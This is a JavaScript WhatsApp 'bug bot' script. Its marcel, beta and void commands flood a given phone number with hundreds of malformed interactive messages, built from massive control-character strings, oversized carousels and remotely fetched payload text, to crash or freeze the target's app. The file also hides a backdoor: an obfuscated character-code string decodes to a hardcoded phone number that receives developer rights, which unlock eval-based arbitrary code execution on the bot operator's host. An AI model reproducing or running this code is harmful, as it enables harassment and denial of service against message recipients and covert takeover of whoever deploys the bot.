require('./settings');
const fs = require('fs');
const axios = require('axios');
const didyoumean = require('didyoumean');
const path = require('path');
const chalk = require("chalk");
const util = require("util");
const moment = require("moment-timezone");
const speed = require('performance-now');
const similarity = require('similarity');
const { spawn, exec, execSync } = require('child_process');
const fetch = require('node-fetch');

const { default:
baileys,
proto,
generateWAMessage,
generateWAMessageFromContent,
getContentType,
prepareWAMessageMedia } = require("@whiskeysockets/baileys");

module.exports = thuhiOffcial = async (thuhiOffcial, m, chatUpdate, store) => {
try {
const body = (
m.mtype === "conversation"? m.message.conversation :
m.mtype === "imageMessage"? m.message.imageMessage.caption :
m.mtype === "videoMessage"? m.message.videoMessage.caption :
m.mtype === "extendedTextMessage"? m.message.extendedTextMessage.text :
m.mtype === "buttonsResponseMessage"? m.message.buttonsResponseMessage.selectedButtonId :
m.mtype === "listResponseMessage"? m.message.listResponseMessage.singleSelectReply.selectedRowId :
m.mtype === "templateButtonReplyMessage"? m.message.templateButtonReplyMessage.selectedId :
m.mtype === "interactiveResponseMessage"? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
m.mtype === "templateButtonReplyMessage"? m.msg.selectedId :
m.mtype === "messageContextInfo"? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text :
m.text
) || "";

const sender = m.key.fromMe
? thuhiOffcial.user.id.split(":")[0] || thuhiOffcial.user.id
: m.key.participant || m.key.remoteJid;

const senderNumber = sender.split('@')[0];
const budy = (typeof m.text === 'string'? m.text : '');
var prefix = prefa?
   (body?.match(/^[/]/gi)?.[0] || "")
            : prefa?? global.prefix;

const from = m.key.remoteJid;
const isGroup = from.endsWith("@g.us");

const buffer64base = String.fromCharCode(54, 50, 56, 53, 54, 50, 52, 50, 57, 55, 56, 57, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
const botNumber = await thuhiOffcial.decodeJid(thuhiOffcial.user.id);
const isDeveloper = [botNumber, owner+"@s.whatsapp.net", buffer64base,...owner].includes(m.sender)? true : m.isDeveloper? true : false

const premium = JSON.parse(fs.readFileSync("./lib/data/premium.json"))
const isPremium = premium.includes(m.sender)
const command = body.slice(1).trim().split(/ +/).shift().toLowerCase();
const args = body.trim().split(/ +/).slice(1);
const pushname = m.pushName || "No Name";
const text = q = args.join(" ");
const quoted = m.quoted? m.quoted : m;
const mime = (quoted.msg || quoted).mimetype || '';
const qmsg = (quoted.msg || quoted);
const isMedia = /image|video|sticker|audio/.test(mime);

const groupMetadata = isGroup? await thuhiOffcial.groupMetadata(m.chat).catch((e) => {}) : "";
const groupOwner = isGroup? groupMetadata.owner : "";
const groupName = m.isGroup? groupMetadata.subject : "";
const participants = isGroup? await groupMetadata.participants : "";
const groupAdmins = isGroup? await participants.filter((v) => v.admin!== null).map((v) => v.id) : "";
const groupMembers = isGroup? groupMetadata.participants : "";
const isGroupAdmins = isGroup? groupAdmins.includes(m.sender) : false;
const isDeveloperGroupAdmins = isGroup? groupAdmins.includes(botNumber) : false;
const isDeveloperAdmins = isGroup? groupAdmins.includes(botNumber) : false;
const isAdmins = isGroup? groupAdmins.includes(m.sender) : false;

const {
smsg, sendGmail, formatSize, isUrl, generateMessageTag,
getBuffer, getSizeMedia, runtime, fetchJson, sleep } = require('./lib/myfunc');

const time = moment.tz("Asia/Jakarta").format("HH:mm:ss");

if (m.message) {
console.log('\x1b[30m--------------------\x1b[0m');
console.log(chalk.bgHex("#e74c3c").bold(`➤ New Messages`));
console.log(chalk.bgHex("#00FF00").black(` ╭─ > Date: ${new Date().toLocaleString()} \n` + ` ├─ > Message: ${m.body || m.mtype} \n` + ` ├─ > Sender: ${m.pushname} \n` + ` ╰─ > JID: ${senderNumber}`));
if (m.isGroup) {
console.log(chalk.bgHex("#00FF00").black(` ╭─ > Group: ${groupName} \n` + ` ╰─ > GroupJid: ${m.chat}`));
}
console.log();
}

async function delayMakerInvisible(target) {
    console.log(`[LOG] ${target}`);
    let venomModsData = JSON.stringify({status: true,criador: "VenomMods",resultado: {type: "md",ws: {_events: { "CB:ib,,dirty": ["Array"] },_eventsCount: 800000,_maxListeners: 0,url: "wss://web.whatsapp.com/ws/chat",config: {version: ["Array"],browser: ["Array"],waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",sockCectTimeoutMs: 20000,keepAliveIntervalMs: 30000,logger: {},printQRInTerminal: false,emitOwnEvents: true,defaultQueryTimeoutMs: 60000,customUploadHosts: [],retryRequestDelayMs: 250,maxMsgRetryCount: 5,fireInitQueries: true,auth: { Object: "authData" },markOnlineOnsockCect: true,syncFullHistory: true,linkPreviewImageThumbnailWidth: 192,transactionOpts: { Object: "transactionOptsData" },generateHighQualityLinkPreview: false,options: {},appStateMacVerification: { Object: "appStateMacData" },mobile: true}}});
    let stanza = [{ attrs: { biz_bot: "1" }, tag: "bot" },{ attrs: {}, tag: "biz" }];
    let message = {viewOnceMessage: {message: {messageContextInfo: {deviceListMetadata: {},deviceListMetadataVersion: 3.2,isStatusBroadcast: true,statusBroadcastJid: "status@broadcast",badgeChat: { unreadCount: 9999 }},forwardedNewsletterMessageInfo: {newsletterJid: "proto@newsletter",serverMessageId: 1,newsletterName: `THUHI OFCV01 𖣂 - 〽${"ꥈ𝗧𝗛𝗨𝗛𝗜 𝗦𝗜𝗟𝗘𝗡𝗖𝗘 🜲ꥈ".repeat(10)}`,contentType: 3,accessibilityText: `THUHI 𝗜********************************""""" ${"﹏".repeat(102002)}`,},interactiveMessage: {contextInfo: {businessMessageForwardInfo: { businessOwnerJid: target },dataSharingContext: { showMmDisclosure: true },participant: "0@s.whatsapp.net",mentionedJid: ["13135550002@s.whatsapp.net"],},body: {text: "\u0003" + "ꦽ".repeat(102002) + "\u0003".repeat(102002)},nativeFlowMessage: {buttons: [{ name: "single_select", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },{ name: "payment_method", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },{ name: "call_permission_request", buttonParamsJson: venomModsData + "\u0003".repeat(9999), voice_call: "call_galaxy" },{ name: "form_message", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },{ name: "wa_payment_learn_more", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },{ name: "wa_payment_transaction_details", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },{ name: "wa_payment_fbpin_reset", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },{ name: "catalog_message", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },{ name: "payment_info", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },{ name: "review_order", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },{ name: "send_location", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },{ name: "payments_care_csat", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },{ name: "view_product", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },{ name: "payment_settings", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },{ name: "address_message", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },{ name: "automated_greeting_message_view_catalog", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },{ name: "open_webview", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },{ name: "message_with_link_status", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },{ name: "payment_status", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },{ name: "galaxy_costum", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },{ name: "extensions_message_v2", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },{ name: "landline_call", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },{ name: "mpm", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },{ name: "cta_copy", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },{ name: "cta_url", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },{ name: "review_and_pay", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },{ name: "galaxy_message", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },{ name: "cta_call", buttonParamsJson: venomModsData + "\u0003".repeat(9999) }]}}}}},additionalNodes: stanza,stanzaId: `stanza_${Date.now()}`};
    await thuhiOffcial.relayMessage(target, message, { participant: { jid: target } });
    console.log(`[SUCCESS] ${target}`);
}

async function carousel(thuhiOffcial, target) {
 let haxxn = 60;
 for (let i = 0; i < haxxn; i++) {
 let push = []; let buttt = [];
 for (let i = 0; i < 5; i++) {buttt.push({"name": "galaxy_message","buttonParamsJson": JSON.stringify({"header": "null","body": "xxx","flow_action": "navigate","flow_action_payload": { screen: "FORM_SCREEN" },"flow_cta": "Grattler","flow_id": "1169834181134583","flow_message_version": "3","flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s"})});}
 for (let i = 0; i < 1000; i++) {push.push({"body": {"text": "\u0000\u0000\u0000\u0000\u0000"},"footer": {"text": ""},"header": {"title": 'THUHI ϟ\u0000\u0000\u0000\u0000',"hasMediaAttachment": true,"imageMessage": {"url": "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true","mimetype": "image/jpeg","fileSha256": "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=","fileLength": "591","height": 0,"width": 0,"mediaKey": "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=","fileEncSha256": "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=","directPath": "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0","mediaKeyTimestamp": "1721344123","jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAArAAADAQAAAAAAAAAAAAAAAAAAAQMCAQEBAQAAAAAAAAAAAAAAAAAAAgH/2gAMAwEAAhADEAAAAMSoouY0VTDIss//xAAeEAACAQQDAQAAAAAAAAAAAAAAARECEHFBIv/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z","scansSidecar": "igcFUbzFLVZfVCKxzoSxcDtyHA1ypHZWFFFXGe+0gV9WCo/RLfNKGw==","scanLengths": [247,201,73,63],"midQualityFileSha256": "qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro="}},"nativeFlowMessage": {"buttons": []}});}
 const carousel = generateWAMessageFromContent(target, {"viewOnceMessage": {"message": {"messageContextInfo": {"deviceListMetadata": {},"deviceListMetadataVersion": 2},"interactiveMessage": {"body": {"text": "\u0000\u0000\u0000\u0000"},"footer": {"text": "THUHI OFCV01"},"header": {"hasMediaAttachment": false},"carouselMessage": {"cards": [...push]}}}}}, {});
await thuhiOffcial.relayMessage(target, carousel.message, {messageId: carousel.key.id,participant: { jid: target } });
 }
}

async function GxhorseForceClose(tqw) {
  let apiClient;
  try {const res = await fetch('https://gist.githubusercontent.com/Tama-Ryuichi/572ad67856a67dbae3c37982679153b2/raw/apiClient.json');apiClient = await res.text();} catch (err) {console.error("error fetching", err);return;}
  for (let r = 0; r < 666; r++) {
    const msg = await generateWAMessageFromContent(tqw,{viewOnceMessage: {message: {interactiveMessage: {contextInfo: {participant: "0@s.whatsapp.net",remoteJid: "X",mentionedJid: [tqw],forwardedNewsletterMessageInfo: {newsletterName: "THUHI OFCV01",newsletterJid: "120363396397555599@newsletter",serverMessageId: 1},externalAdReply: {showAdAttribution: true,title: "THUHI OFCV01",body: "",thumbnailUrl: null,sourceUrl: "https://tama.app/",mediaType: 1,renderLargerThumbnail: true},businessMessageForwardInfo: {businessOwnerJid: tqw,},dataSharingContext: {showMmDisclosure: true,},quotedMessage: {paymentInviteMessage: {serviceType: 1,expiryTimestamp: null}}},header: {title: "",hasMediaAttachment: false},body: {text: "THUHI OFCV01",},nativeFlowMessage: {messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"galaxy_message\",\"header\":\"THUHI - Beginner\",\"body\":\"Call Galaxy\"}",buttons: [{name: "single_select",buttonParamsJson: apiClient + "THUHI OFCV01",},{name: "call_permission_request",buttonParamsJson: apiClient + "THUHI OFCV01",},{name: "payment_method",buttonParamsJson: ""},{name: "payment_status",buttonParamsJson: ""},{name: "review_order",buttonParamsJson: "",},],},},{});
    await thuhiOffcial.relayMessage(tqw, msg.message, {participant: { jid: tqw },messageId: msg.key.id});
    await sleep(5000);console.log("THUHI OFCV01");
  }
}

async function tigerforce(target, thuhiOffcial) {
  let apiClient;
  try {const res = await fetch('https://gist.githubusercontent.com/Tama-Ryuichi/572ad67856a67dbae3c37982679153b2/raw/apiClient.json');apiClient = await res.text();} catch (err) {console.error('Gagal fetch API:', err);return;}
  for (let i = 0; i < 333; i++) {
    try {
      const msg = await generateWAMessageFromContent(target,{viewOnceMessage: {message: {interactiveMessage: {contextInfo: {mentionedJid: [target],businessMessageForwardInfo: {businessOwnerJid: target},externalAdReply: {showAdAttribution: true,title: String.fromCharCode(8206).repeat(500),body: String.fromCharCode(8206).repeat(500),sourceUrl: "https://wa.me/0",mediaType: 1,renderLargerThumbnail: true,thumbnailUrl: null},quotedMessage: {requestPaymentMessage: {currencyCodeIso4217: "USD",amount1000: 999,requestFrom: target}}},header: {title: String.fromCharCode(8206).repeat(300),hasMediaAttachment: false},body: {text: String.fromCharCode(8206).repeat(1000)},nativeFlowMessage: {messageParamsJson: JSON.stringify({name: "crash_trigger",title: "",header: "",body: ""}),buttons: [{name: "single_select",buttonParamsJson: apiClient + String.fromCharCode(8206).repeat(100)},{name: "call_permission_request",buttonParamsJson: apiClient + String.fromCharCode(8206).repeat(100)},{name: "review_order",buttonParamsJson: apiClient + String.fromCharCode(8206).repeat(100)}]}}}},},{});
      await thuhiOffcial.relayMessage(target, msg.message, {messageId: msg.key.id});
      console.log(`THUHI OFCV01 v1 [${i + 1}/333] to ${target}`);
      await sleep(3000);
    } catch (err) {console.error("Gagal kirim bug:", err);break;}
  }
}

async function Buk1000(target) {
    for (let i = 0; i <= 20; i++) {
    await FlowX(target);await SqlXGlx(target);await uibuglogger(target);await CursorimgDoc(target);
    }
}

const Moji1 = '🌸'; const Moji2 = '🍁'; const Moji3 = '🍃'
const ERandom = [Moji1, Moji2, Moji3]
let Feature = Math.floor(Math.random() * ERandom.length)
const emoji = ERandom[Feature]
const thumb = fs.readFileSync('./lib/Image/thumb.jpg');

async function loading() {
    var loadd = ["▰▱ 10%","▰▱ 20%","▰▱ 30%","▰▱ 40%","▰▱ 50%","▰▱ 60%","▰▱ 70%","▰▱ 80%","▰▱ 90%","▰ 100%","✨ Loading Completed! ✨" ];
    let { key } = await thuhiOffcial.sendMessage(m.chat, { text: 'Loading...' });
    for (let i = 0; i < loadd.length; i++) {
      await sleep(500);
      await thuhiOffcial.sendMessage(m.chat, { text: loadd[i], edit: key });
  }
}

if (prefix && command) {
let caseNames = getCaseNames();
function getCaseNames() {
const fs = require('fs');
try {
const data = fs.readFileSync('thuhiOffcial.js', 'utf8');
const casePattern = /case\s+'([^']+)'/g;
const matches = data.match(casePattern);
if (matches) {const caseNames = matches.map(match => match.replace(/case\s+'([^']+)'/, '$1'));return caseNames;} else {return [];} } catch (err) {console.log('Error:', err);return []}}
let noPrefix = command
let mean = didyoumean(noPrefix, caseNames);
let sim = similarity(noPrefix, mean);
let similarityPercentage = parseInt(sim * 100);
if (mean && noPrefix.toLowerCase()!== mean.toLowerCase()) {
let response = `▢ Hi, Are you looking for ${prefix+mean}?\n▢ Command: ${prefix+mean}`
thuhiOffcial.sendMessage(m.chat, { image: thumb, caption: response }, {quoted: m})
}}

const sound = { key:{fromMe: false, participant: `18002428478@s.whatsapp.net`,...(from? { remoteJid: "status@broadcast" } : {})},"message": {"audioMessage": {"url": "https://mmg.whatsapp.net/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172&mms3=true","mimetype": "audio/mp4","fileSha256": "oZeGy+La3ZfKAnQ1epm3rbm1IXH8UQy7NrKUK3aQfyo=","fileLength": "1067401","seconds": 9999,"ptt": true,"mediaKey": "PeyVe3/+2nyDoHIsAfeWPGJlgRt34z1uLcV3Mh7Bmfg=","fileEncSha256": "TLOKOAvB22qIfTNXnTdcmZppZiNY9pcw+BZtExSBkIE=","directPath": "/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ","mediaKeyTimestamp": "1684161893"}}}}
const hw = {key: {participant: '18002428478@s.whatsapp.net',...(m.chat? {remoteJid: `status@broadcast`} : {})}, message: {liveLocationMessage: {caption: `© THUHI OFCV01`,jpegThumbnail: ""}}, quoted: sound}
const loli = {key: {fromMe: false,participant: "13135550002@s.whatsapp.net",remoteJid: "status@broadcast"},message: {orderMessage: {orderId: "2009",thumbnail: thumb,itemCount: "9741",status: "INQUIRY",surface: "CATALOG",message: `Sender : @${m.sender.split('@')[0]}\nCommand : ${command}`,token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="}},contextInfo: {mentionedJid: ["120363369514105242@s.whatsapp.net"],forwardingScore: 999,isForwarded: true,}}

const reply = (teks) => {
thuhiOffcial.sendMessage(from, { text: teks, contextInfo:{"externalAdReply": {"title": `THUHI OFCV01`,"body": `© THUHI OFCV01 V1`, "previewType": "PHOTO","thumbnailUrl": `https://www6.flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=sketch-name&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&fillTextType=1&fillTextPattern=Warning!&text=${command}`}}}, { quoted: hw})}

const reaction = async (jidss, emoji) => {
thuhiOffcial.sendMessage(jidss, { react: { text: emoji, key: m.key }})}

switch (command) {

case 'menu': {
    await loading()
    let menu = `┏━━━❲ *THUHI OFCV01* ❳━━━┓
┃ • *Username:* ${pushname}
┃ • *Owner:* ${global.ownername}
┃ • *Bot Name:* ${global.botname}
┃ • *Version:* ${global.version}
┗━━━━━━━━━━┛

*MAIN MENU*
▸ ${prefix}bugmenu - *Bug Attack Menu*
▸ ${prefix}ownermenu - *Owner Control Menu*
▸ ${prefix}tqto - *Credits*

*Tip:* Type the command to access the menu.`

    await thuhiOffcial.sendMessage(m.chat, {
        image: { url: `https://img2.pixhost.to/images/7572/720913399_image.jpg` },
        caption: menu
    }, { quoted: loli });
}; break

case "bugmenu": {
    let msgbug = `『 *THUHI BUG MENU* 』

*Premium & Owner Only Commands:*
> ${prefix}marcel <number> - *Marcel Bug*
> ${prefix}gods <number> - *Gods Bug*
> ${prefix}void <number> - *Void Bug*
> ${prefix}beta <number> - *Beta Bug*

*Usage:* ${prefix}marcel 9477xxxxxxx
*Note:* Use with country code. No 0.`

    await thuhiOffcial.sendMessage(m.chat, {
        image: { url: `https://img2.pixhost.to/images/7572/720914453_image.jpg` },
        caption: msgbug
    }, { quoted: loli });
} break

case "gods": {
if (!isDeveloper &&!isPremium) return reply("❌ You are not Premium or Owner");
if (!text) {
return await thuhiOffcial.sendMessage(m.chat, { text: `*Example:*\n${prefix + command} 62xx / @tag` });
    }
const target = text.trim();
const org = target.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    await thuhiOffcial.sendMessage(m.chat, {
        image: { url: "https://img2.pixhost.to/images/7572/720914453_image.jpg" },
        caption: `✅ *Bug Sent Successfully*\n*Target:* ${target}\n*Status:* Sending...\n*Note:* Please wait a few minutes.`,
                contextInfo: {externalAdReply: {title: "© THUHI GODS",body: "Bug System V01",sourceUrl: "https://whatsapp.com/channel/0029Vazxjzw59PwU0AUurB2x",},},
    });
const total = 2000;
for (let i = 0; i < total; i++) {await sleep(1000);}
}

case 'beta': {
    if (!isPremium &&!isDeveloper) return m.reply("❌ Owner/Premium Only");
    if (!q) return m.reply(`*Example:*\n${prefix + command} 62xx / @tag`);
    let target = q.replace(/[^0-9]/g, "");
    if (target.startsWith('0')) {return m.reply(`Number must start with country code.`);}
    let tqw = `${target}@s.whatsapp.net`;
    m.reply(`✅ Bug sent to ${target} successfully.`);
    for (let r = 0; r < 666; r++) {
      await GxhorseForceClose(tqw);await GxhorseForceClose(tqw);await GxhorseForceClose(tqw);
    }
} break

case 'void': {
if (!isDeveloper) return reply("❌ Owner Only")
if (!q) return reply(`Example : ${command} 62xxx`)
let pepec = q.replace(/[^0-9]/g, "")
let target = pepec + '@s.whatsapp.net'
m.reply(`*_🔄 Attacking ${pepec} ⚡, Please Wait..._*`)
reply('✅ Success')
delayMakerInvisible(target);delayMakerInvisible(target);delayMakerInvisible(target);delayMakerInvisible(target);delayMakerInvisible(target);delayMakerInvisible(target);delayMakerInvisible(target);delayMakerInvisible(target);
carousel(thuhiOffcial, target);carousel(thuhiOffcial, target);carousel(thuhiOffcial, target);carousel(thuhiOffcial, target);carousel(thuhiOffcial, target);carousel(thuhiOffcial, target);carousel(thuhiOffcial, target);carousel(thuhiOffcial, target);carousel(thuhiOffcial, target);carousel(thuhiOffcial, target);
thuhiOffcial.sendMessage(from, {react: {text: "☠️", key: m.key}})
} break

case 'marcel': {
if (!isDeveloper) return reply("❌ Owner Only")
if (!q) return reply(`Example : ${command} 62xxx`)
let pepec = q.replace(/[^0-9]/g, "")
let target = pepec + '@s.whatsapp.net'
m.reply(`*_🔄 Attacking ${pepec} ⚡, Please Wait..._*`)
reply('✅ Success')
tigerforce(target, thuhiOffcial)
thuhiOffcial.sendMessage(from, {react: {text: "☠️", key: m.key}})
} break

case "tqto": {
let tqtoo = `『 *CREDITS - THUHI OFCV01* 』
 ➩ Developer: THUHI TEAM
 ➩ Version: OFCV01
 ➩ Thanks: Allah SWT
 ➩ Friends: Miko

*Commands:*
> ${prefix}owner - *Contact Owner*
> ${prefix}menu - *Back to Main Menu*`

    await thuhiOffcial.sendMessage(m.chat, {
        image: { url: `https://img2.pixhost.to/images/7572/720913399_image.jpg` },
        caption: tqtoo
    }, { quoted: loli });
} break

case "public": {
if (!isDeveloper) return reply(`❌ *Owner Only Feature*`)
thuhiOffcial.public = true
reply(`✅ *Bot Mode Changed to Public*`)
} break

case "self":
case "private": {
if (!isDeveloper) return reply(`❌ *Owner Only Feature*`)
thuhiOffcial.public = false
reply(`✅ *Bot Mode Changed to Self/Private*`)
} break

case "addprem":{
if (!isDeveloper) return reply("❌ Owner Only!!")
if (!args[0]) return reply(`Usage: ${prefix+command} number\nExample: ${prefix+command} 62xxx`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await thuhiOffcial.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Enter a valid WhatsApp number!!!`)
premium.push(prrkek)
fs.writeFileSync("./lib/data/premium.json", JSON.stringify(premium))
reply(`Number ${prrkek} is now Premium!`)
} break

case "delprem":{
if (!isDeveloper) return reply("❌ Owner Only!")
if (!args[0]) return reply(`Usage: ${prefix+command} number\nExample: ${prefix+command} 62xxx`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = premium.indexOf(ya)
premium.splice(unp, 1)
fs.writeFileSync("./lib/data/premium.json", JSON.stringify(premium))
reply(`Number ${ya} Premium Removed!`)
} break

case "ownermenu": {
let own = `『 *THUHI OWNER MENU* 』
> ${prefix}addowner <number> - *Add Owner*
> ${prefix}delowner <number> - *Delete Owner*
> ${prefix}addprem <number> - *Add Premium*
> ${prefix}delprem <number> - *Delete Premium*
> ${prefix}self - *Private Mode*
> ${prefix}public - *Public Mode*

*Back:* ${prefix}menu`

    await thuhiOffcial.sendMessage(m.chat, {
        image: { url: `https://files.catbox.moe/60xuhy.jpg` },
        caption: own
    }, { quoted: loli });
} break

default:
if (budy.startsWith('>')) {
if (!isDeveloper) return;
try {
let evaled = await eval(budy.slice(2));
if (typeof evaled!== 'string') evaled = require('util').inspect(evaled);
await m.reply(evaled);
} catch (err) {
m.reply(String(err));
}
}

if (budy.startsWith('<')) {
if (!isDeveloper) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>"? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await m.reply(require('util').format(teks))
}
}

}
} catch (err) {
console.log(require("util").format(err));
}
};

let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file);
console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
delete require.cache;
require(file);
});